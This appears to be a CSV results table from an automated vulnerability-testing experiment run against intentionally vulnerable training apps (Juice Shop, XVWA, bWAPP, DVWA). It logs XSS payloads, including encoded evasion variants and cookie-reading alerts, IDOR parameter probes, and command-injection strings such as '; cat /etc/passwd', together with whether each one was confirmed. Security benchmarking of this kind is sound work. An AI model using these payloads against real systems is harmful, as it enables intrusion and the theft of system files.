+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,9,<script>alert(document.cookie)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:42:58.323038+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,10,<img src=x onerror=confirm(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,94,,2026-10-19T02:42:58.421812+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,1,<img src=x onerror=alert(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:42:58.521367+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,2,<script>confirm(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:42:58.628942+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,3,<img src=x onerror=confirm(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:42:58.737017+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,4,<svg onload=alert(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:42:58.837560+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,5,<script>alert(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:42:58.944713+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,6,<iframe src=javascript:alert(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:42:59.054609+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,7,<script>prompt(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:42:59.162079+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,8,<script>alert(document.cookie)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:42:59.279074+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,9,<svg onload=confirm(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:42:59.376948+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Advanced,10,<body onload=alert(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:42:59.476594+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,94,,2026-10-19T02:42:59.582154+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,2,%3Cimg%20src=x%20onerror=confirm(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,109,,2026-10-19T02:42:59.686442+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:42:59.786057+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,4,%3Ciframe%20src=javascript:alert(1)%3E,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,93,,2026-10-19T02:42:59.885823+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,5,%3Cscript%3Ealert(document.cookie)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:42:59.986307+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,6,%3Csvg%20onload=confirm(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:43:00.086191+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,7,%3Cscript%3Econfirm(1)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:43:00.191681+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,8,%3Cscript%3Eprompt(1)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:43:00.293718+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,9,%3Cbody%20onload=alert(1)%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,93,,2026-10-19T02:43:00.394031+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Evasion,10,%3Cscript%3Ealert(1)%3C/script%3E,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:43:00.493181+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,1,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,312,,2026-10-19T02:43:00.804132+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,2,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:00.983904+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,3,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:43:01.162090+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,4,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,171,,2026-10-19T02:43:01.334030+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,5,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,157,,2026-10-19T02:43:01.491808+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,6,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:43:01.680819+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,7,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:43:01.865658+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,8,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:02.049007+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,9,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,171,,2026-10-19T02:43:02.215443+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Basic,10,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:02.387807+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,1,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:02.564446+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,2,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:43:02.740099+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,3,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:02.913286+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,4,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:43:03.072617+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,5,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:03.239042+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,6,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:03.411632+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,7,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:43:03.571421+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,8,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:03.744447+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,9,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:03.920864+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Advanced,10,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:43:04.077730+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:04.245912+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,2,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:04.411694+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,171,,2026-10-19T02:43:04.594156+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,4,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,157,,2026-10-19T02:43:04.742782+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,5,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:43:04.942369+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,6,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:05.116637+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,7,%3Cscript%3Econfirm(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:43:05.276553+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,8,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:05.451483+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,9,%3Cbody%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:43:05.633161+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,XSS,Evasion,10,%3Cscript%3Ealert(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,157,,2026-10-19T02:43:05.800501+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,1,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,313,,2026-10-19T02:43:06.124589+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,2,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:43:06.342078+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,3,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,204,,2026-10-19T02:43:06.548218+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,4,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,234,,2026-10-19T02:43:06.781961+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,5,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:06.990678+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,6,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:43:07.223647+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,7,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:43:07.437214+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,8,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:07.647397+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,9,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:43:07.863275+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Basic,10,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:08.072742+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,1,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:08.295747+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,2,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:43:08.510736+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,3,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,235,,2026-10-19T02:43:08.740641+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,4,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:43:08.953581+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,5,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:09.169637+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,6,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:43:09.352418+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,7,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:09.577642+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,8,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,234,,2026-10-19T02:43:09.805768+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,9,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,250,,2026-10-19T02:43:10.051505+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Advanced,10,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:10.276069+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:10.491993+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,2,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,218,,2026-10-19T02:43:10.717190+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:10.932831+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,4,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:43:11.113600+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,5,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,234,,2026-10-19T02:43:11.346883+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,6,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:11.557542+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,7,%3Cscript%3Econfirm(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,235,,2026-10-19T02:43:11.790050+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,8,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:43:11.989803+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,9,%3Cbody%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:43:12.188929+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,XSS,Evasion,10,%3Cscript%3Ealert(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,219,,2026-10-19T02:43:12.397312+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Basic,1,user=2,401,NO_CONFIRMATION_SIGNAL,false,,,453,,2026-10-19T02:43:15.231331+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Basic,2,id=1,401,NO_CONFIRMATION_SIGNAL,false,,,312,,2026-10-19T02:43:15.108505+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Basic,3,id=3,401,NO_CONFIRMATION_SIGNAL,false,,,343,,2026-10-19T02:43:15.130834+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Basic,4,id=100,401,NO_CONFIRMATION_SIGNAL,false,,,328,,2026-10-19T02:43:15.135622+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Basic,5,user=1,401,NO_CONFIRMATION_SIGNAL,false,,,328,,2026-10-19T02:43:15.157778+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Basic,6,account=1,401,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:43:15.161779+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Basic,7,id=2,401,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:43:15.161779+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Advanced,1,account=1,401,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:43:15.161779+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Advanced,2,user=2,401,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:43:15.135622+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Advanced,3,id=3,401,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:43:15.266394+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Advanced,4,id=100,401,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:15.303801+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Advanced,5,user=1,401,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:15.294664+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Advanced,6,id=2,401,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:15.309391+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Advanced,7,id=1,401,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:43:15.317474+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Evasion,1,id=2,401,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:43:15.313647+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Evasion,2,account=1,401,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:43:15.321713+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Evasion,3,id=100,401,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:43:15.326588+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Evasion,4,user=1,401,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:43:15.328276+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Evasion,5,user=2,401,NO_CONFIRMATION_SIGNAL,false,,,46,,2026-10-19T02:43:15.342937+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Evasion,6,id=1,401,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:43:15.346937+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,IDOR,Evasion,7,id=3,401,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:15.350541+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Basic,1,user=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,234,,2026-10-19T02:43:14.756412+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Basic,2,id=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,31,,2026-10-19T02:43:14.560220+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Basic,3,id=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,15,,2026-10-19T02:43:14.563356+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Basic,4,id=100,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,31,,2026-10-19T02:43:14.580195+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Basic,5,user=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:43:14.598792+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Basic,6,account=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:43:14.605331+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Basic,7,id=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,62,,2026-10-19T02:43:14.640058+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Advanced,1,account=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,63,,2026-10-19T02:43:14.661291+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Advanced,2,user=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,63,,2026-10-19T02:43:14.671557+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Advanced,3,id=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:43:14.683973+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Advanced,4,id=100,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,31,,2026-10-19T02:43:14.698649+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Advanced,5,user=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,31,,2026-10-19T02:43:14.703441+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Advanced,6,id=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,31,,2026-10-19T02:43:14.715727+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Advanced,7,id=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,31,,2026-10-19T02:43:14.727487+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Evasion,1,id=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,31,,2026-10-19T02:43:14.731891+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Evasion,2,account=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,32,,2026-10-19T02:43:14.740284+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Evasion,3,id=100,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:43:14.771493+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Evasion,4,user=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:43:14.780441+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Evasion,5,user=2,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,47,,2026-10-19T02:43:14.789161+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Evasion,6,id=1,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,32,,2026-10-19T02:43:14.795766+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,IDOR,Evasion,7,id=3,200,OBJECT_RESPONSE_UNCONFIRMED,false,object_returned_without_ownership_oracle,,31,,2026-10-19T02:43:14.802496+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Basic,1,&& uname -a,200,NO_CONFIRMATION_SIGNAL,false,,,469,,2026-10-19T02:43:15.782694+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Basic,2,| cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,156,,2026-10-19T02:43:15.483337+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Basic,3,; pwd,200,NO_CONFIRMATION_SIGNAL,false,,,172,,2026-10-19T02:43:15.502464+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Basic,4,; cat /etc/passwd,200,COMMAND_OUTPUT_CONFIRMED,true,command_output_marker,,187,,2026-10-19T02:43:15.510385+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Basic,5,; ls,200,NO_CONFIRMATION_SIGNAL,false,,,203,,2026-10-19T02:43:15.533028+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,Command Injection,Basic,6,| whoami,200,NO_CONFIRMATION_SIGNAL,false,,,204,,2026-10-19T02:43:15.548751+00:00
